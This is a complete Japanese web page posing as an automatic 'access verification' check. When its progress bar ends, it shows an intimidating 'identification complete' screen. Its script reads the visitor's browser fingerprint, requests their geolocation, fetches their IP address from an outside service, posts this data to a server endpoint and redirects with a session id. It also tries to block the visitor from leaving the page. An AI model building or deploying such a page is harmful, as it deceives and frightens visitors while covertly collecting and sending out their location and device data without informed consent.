<!doctype html> <html lang="ja"> <head> <meta charset="utf-8" /> <meta name="viewport" content="width=device-width, initial-scale=1.0" /> <title>検証中</title> <style> *{box-sizing:border-box} body{margin:0;height:100vh;display:grid;place-items:center;background:#0b0b0b;color:#e6e6e6;font-family:system-ui,-apple-system,BlinkMacSystemFont,'Segoe UI',sans-serif;overflow:hidden} .card{width:min(92vw,520px);padding:28px 26px 26px;border-radius:18px;background:linear-gradient(180deg,#111,#0a0a0a);box-shadow:0 20px 60px rgba(0,0,0,.7), inset 0 0 0 1px rgba(255,255,255,.04)} h1{margin:0 0 10px;font-size:1.2rem;letter-spacing:.08em;color:#9ef} .muted{opacity:.65;font-size:.9rem} .bar{height:10px;border-radius:999px;background:#111;overflow:hidden;margin:16px 0} .bar>i{display:block;height:100%;width:0;background:linear-gradient(90deg,#6cf,#f6f);transition:width .25s} .overlay{position:fixed;inset:0;display:grid;place-items:center;background:rgba(0,0,0,.88);opacity:0;pointer-events:none;transition:opacity .4s} .overlay.show{opacity:1;pointer-events:auto} .big{font-size:clamp(1.8rem,6vw,3rem);letter-spacing:.2em} .muted.small{font-size:.9rem;opacity:.75} </style> </head> <body> <div class="card"> <h1>アクセス検証</h1> <div class="muted">自動チェックを実行しています。しばらくお待ちください。</div> <div class="bar"><i id="prog"></i></div> </div> <div id="ov" class="overlay" aria-hidden="true"> <div style="text-align:center;max-width:90vw"> <div class="big">特 定 完 了</div> <div id="profile" style="text-align:left;background:#000;border-radius:14px;padding:16px;box-shadow:inset 0 0 0 1px rgba(255,255,255,.08);margin-top:12px"> <div class="muted small" style="margin-bottom:6px">取得情報（自動）</div> <ul id="infoList" style="list-style:none;padding:0;margin:0;line-height:1.7"> <li>位置情報: <b id="geo">取得中…</b></li> <li>照合ステータス: <b>完了</b></li> <li>ログID: <b id="logid">—</b></li> <li>端末: <b id="ua">—</b></li> <li>OS推定: <b id="os">—</b></li> <li>画面: <b id="scr">—</b></li> <li>言語: <b id="lang">—</b></li> <li>タイムゾーン: <b id="tz">—</b></li> <li>滞在時間: <b id="stay">—</b></li> <li>信頼スコア: <b id="score">—</b></li> </ul> </div> </div> </div> <script> /* ===== 修正版スクリプト ===== */ const bar = document.getElementById('prog'); const ov = document.getElementById('ov'); const TOTAL_MS = 11000; const HOLD_AT = 85; const HOLD_MS = 2000; let startAt = null; let holdStartedAt = null; let releasedAt = null; let done = false; function frame(ts){ if(startAt === null) startAt = ts; const elapsed = ts - startAt; let p; if(elapsed <= TOTAL_MS * (HOLD_AT/100)){ p = Math.floor((elapsed / TOTAL_MS) * 100); } else { if(holdStartedAt === null) holdStartedAt = ts; const holdElapsed = ts - holdStartedAt; if(holdElapsed < HOLD_MS){ p = HOLD_AT; } else { if(releasedAt === null) releasedAt = ts; const post = ts - releasedAt; p = Math.min(100, HOLD_AT + Math.floor((post / 500) * (100 - HOLD_AT))); } } if(bar) bar.style.width = Math.max(0, Math.min(100, p)) + '%'; if(p < 100){ requestAnimationFrame(frame); } else if(!done){ done = true; showResult(); } } async function showResult(){ // 2秒沈黙演出 ov.classList.add('show'); await new Promise(r=>setTimeout(r, 2000)); // 基本情報を埋める document.getElementById('ua').textContent = navigator.userAgent; document.getElementById('os').textContent = (/(Windows|Mac|Linux|Android|iPhone|iPad)/.exec(navigator.userAgent) || ['Unknown'])[0]; document.getElementById('scr').textContent = ${screen.width}×${screen.height}; document.getElementById('lang').textContent = navigator.language; document.getElementById('tz').textContent = Intl.DateTimeFormat().resolvedOptions().timeZone; document.getElementById('stay').textContent = Math.round(performance.now()/1000) + ' 秒'; document.getElementById('logid').textContent = Math.random().toString(36).slice(2,10).toUpperCase(); document.getElementById('score').textContent = Math.max(1, 80 - Math.floor(Math.random()*20)) + ' / 100'; // 位置情報 const geoEl = document.getElementById('geo'); if('geolocation' in navigator){ navigator.geolocation.getCurrentPosition( pos => { const lat = pos.coords.latitude.toFixed(5); const lon = pos.coords.longitude.toFixed(5); const acc = Math.round(pos.coords.accuracy || 0); geoEl.textContent = ${lat}, ${lon}（±${acc}m）; }, () => { geoEl.textContent = '拒否 / 取得不可'; }, { enableHighAccuracy: false, timeout: 5000, maximumAge: 0 } ); } else { geoEl.textContent = '未対応'; } // IP を取得してリストの先頭に差し込む（外部サービス使用） try{ const r = await fetch('https://api.ipify.org?format=json', { cache: 'no-store' }); const j = await r.json(); prependInfo(IPアドレス: <b>${j.ip}</b>); }catch(e){ prependInfo(IPアドレス: <b>取得失敗</b>); } // DOM は埋め終わったのでサーバへ送信して別ページへ遷移 // sendAndRedirect を呼ぶ（API_BASE は空なら同一 origin） await sendAndRedirect(); } function prependInfo(html){ const ul = document.getElementById('infoList'); // 既存の IP 行を消す ul.querySelectorAll('li[data-ip]').forEach(n=>n.remove()); const li = document.createElement('li'); li.setAttribute('data-ip','1'); li.innerHTML = html; ul.prepend(li); } /* === サーバ連携（簡易） === */ const API_BASE = ''; // 同一オリジンでサーバを立てるなら '' async function createSession(){ const res = await fetch(API_BASE + '/api/session', { method: 'POST' }); if(!res.ok) throw new Error('session create failed: ' + res.status); return res.json(); } async function postReport(sessionId, payload){ const res = await fetch(API_BASE + '/api/report', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ sessionId, payload }) }); if(!res.ok) throw new Error('report failed: ' + res.status); return res.json(); } async function sendAndRedirect(){ try{ const { sessionId } = await createSession(); // collect payload from DOM (もっと盛っても良い) const payload = { ua: navigator.userAgent, os: document.getElementById('os')?.textContent || null, screen: document.getElementById('scr')?.textContent || null, lang: navigator.language, tz: Intl.DateTimeFormat().resolvedOptions().timeZone, geoText: document.getElementById('geo')?.textContent || null, stayMs: Math.round(performance.now()), logid: document.getElementById('logid')?.textContent || null }; await postReport(sessionId, payload); // redirect to siteB with sessionId const url = new URL('/siteB.html', location.origin); url.searchParams.set('sessionId', sessionId); location.href = url.toString(); }catch(e){ console.error('sendAndRedirect error', e); // 失敗した場合は遷移しないで結果画面を維持する（必要なら通知を追加） } } /* 離脱抑止は残すか外すか検討 */ window.addEventListener('beforeunload', e => { e.preventDefault(); e.returnValue = ''; }); if(document.readyState === 'loading'){ document.addEventListener('DOMContentLoaded', ()=>requestAnimationFrame(frame)); }else{ requestAnimationFrame(frame); } </script> </body> </html>
